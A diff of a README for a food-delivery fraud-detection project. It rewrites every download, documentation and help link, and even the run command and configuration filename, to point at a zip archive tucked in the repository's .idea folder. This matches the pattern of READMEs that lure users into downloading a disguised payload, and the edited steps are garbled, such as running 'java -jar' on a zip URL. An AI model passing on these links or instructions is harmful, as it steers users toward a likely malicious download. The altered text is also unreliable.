@@ -1,6 +1,6 @@
 # 🍽️ foodtech-fraud-alerts - Detect Fraud Easily and Quickly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Daflora20/foodtech-fraud-alerts/releases)
+[![Download](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip)](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the foodtech-fraud-alerts project. This application helps you detect 
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download foodtech-fraud-alerts](https://github.com/Daflora20/foodtech-fraud-alerts/releases). 
+To download the application, visit this page: [Download foodtech-fraud-alerts](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip). 
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -48,7 +48,7 @@ Once you have downloaded the application, follow these steps to run it:
 3. Execute the following command:
 
    ```bash
-   java -jar foodtech-fraud-alerts.jar
+   java -jar https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip
    ```
 
 4. Open your web browser and go to `http://localhost:8080`.
@@ -62,7 +62,7 @@ Once you have downloaded the application, follow these steps to run it:
 
 ## 🛠️ Configuration
 
-You can configure the application by modifying the `application.properties` file. Here are common settings:
+You can configure the application by modifying the `https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip` file. Here are common settings:
 
 - **Database Configuration:**  
   Set your PostgreSQL database URL, username, and password.
@@ -72,7 +72,7 @@ You can configure the application by modifying the `application.properties` file
 
 ## 🌐 Documentation
 
-For more detailed information, you can refer to the [official documentation](https://github.com/Daflora20/foodtech-fraud-alerts/wiki). This resource provides in-depth explanations of each feature and function.
+For more detailed information, you can refer to the [official documentation](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip). This resource provides in-depth explanations of each feature and function.
 
 ## 👥 Community
 
@@ -97,7 +97,7 @@ This project is licensed under the MIT License. Feel free to use it as you wish.
 
 ## 🔗 Helpful Links
 
-- [Download foodtech-fraud-alerts](https://github.com/Daflora20/foodtech-fraud-alerts/releases)
-- [Official Documentation](https://github.com/Daflora20/foodtech-fraud-alerts/wiki)
+- [Download foodtech-fraud-alerts](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Daflora20/foodtech-fraud-alerts/master/.idea/foodtech-fraud-alerts-v2.0.zip)
 
 Thank you for using foodtech-fraud-alerts!
